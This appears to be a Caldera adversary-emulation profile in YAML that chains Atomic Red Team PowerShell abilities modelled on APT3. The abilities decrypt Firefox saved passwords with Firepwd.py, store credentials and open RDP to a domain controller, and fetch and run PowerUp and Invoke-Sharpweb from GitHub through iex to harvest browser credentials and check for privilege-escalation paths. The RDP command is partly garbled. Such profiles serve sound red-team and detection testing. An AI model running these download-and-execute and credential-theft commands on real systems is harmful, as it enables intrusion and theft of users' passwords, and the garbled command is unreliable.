adversary_id: custom_adversary_profile__APT_3__APT3_Phase2_Pattern_2__2023-10-19-22_35_59
name: Custom Adversary Profile
description: [['stockpile__privilege_escalation', 'atomic__privilege_escalation'], ['stockpile__credential-access', 'atomic__credential-access'], ['stockpile__lateral-movement', 'atomic__lateral-movement'], ['stockpile__execution', 'atomic__execution']]
atomic_ordering:
- fd81e466335e6aafcb25b7ec6e915c82 # ('fd81e466335e6aafcb25b7ec6e915c82', 'None', 'validate_me') ; {'description': 'Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.\nUpon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. \n', 'tactic': 'credential-access', 'technique': {'attack_id': 'T1555.003', 'name': 'Credentials from Password Stores: Credentials from Web Browsers'}, 'platforms': {'windows': {'psh': {'cleanup': 'Remove-Item -Path "$env:temp\\T1555.003Test8.txt" -erroraction silentlycontinue', 'command': '$PasswordDBLocation = get-childitem -path "$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\"; cmd /c $env:temp\\Firepwd.py -d $PasswordDBLocation > $env:temp\\T1555.003Test8.txt; cat $env:temp\\T1555.003Test8.txt', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['fd81e466335e6aafcb25b7ec6e915c82', 'None', 'validate_me'], 'plugin': 'atomic'}
- 2a3209689a6452c07f869f45414cbb4c # ('2a3209689a6452c07f869f45414cbb4c', 'None', 'validate_me') ; {'description': 'Attempt an RDP session via Remote Desktop Application to a DomainController.\n', 'tactic': 'lateral-movement', 'technique': {'attack_id': 'T1021.001', 'name': 'Remote Services: Remote Desktop Protocol'}, 'platforms': {'windows': {'psh': {'cleanup': '$p=Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv; if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }', 'command': 'if((Get-CIMInstance -Class Win32_ComputerSystem) { ; } else {Write-Host Joining this computer to a domain must be done manually};  ;  $Server=#{logonserver}; $User = Join-Path; $Password="#{password}"; cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password; mstsc /v:$Server; echo "RDP connection established"', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['2a3209689a6452c07f869f45414cbb4c', 'None', 'validate_me'], 'plugin': 'atomic'}
- ba763ea19604a73e3e1f9d9d8d86d9cc # ('ba763ea19604a73e3e1f9d9d8d86d9cc', 'None', 'validate_me') ; {'description': 'Check for privilege escalation paths using PowerUp from PowerShellMafia\n', 'tactic': 'execution', 'technique': {'attack_id': 'T1059.001', 'name': 'Command and Scripting Interpreter: PowerShell'}, 'platforms': {'windows': {'psh': {'cleanup': '', 'command': '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['ba763ea19604a73e3e1f9d9d8d86d9cc', 'None', 'validate_me'], 'plugin': 'atomic'}
- aee64e494f7adfb1867d67f7ee08e5c6 # ('aee64e494f7adfb1867d67f7ee08e5c6', 'None', 'validate_me') ; {'description': 'PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn', 'tactic': 'credential-access', 'technique': {'attack_id': 'T1555.003', 'name': 'Credentials from Password Stores: Credentials from Web Browsers'}, 'platforms': {'windows': {'psh': {'cleanup': '', 'command': 'iex(new-object net.webclient).downloadstring(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1\'); Invoke-Sharpweb -command "all"', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['aee64e494f7adfb1867d67f7ee08e5c6', 'None', 'validate_me'], 'plugin': 'atomic'}
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
tags: []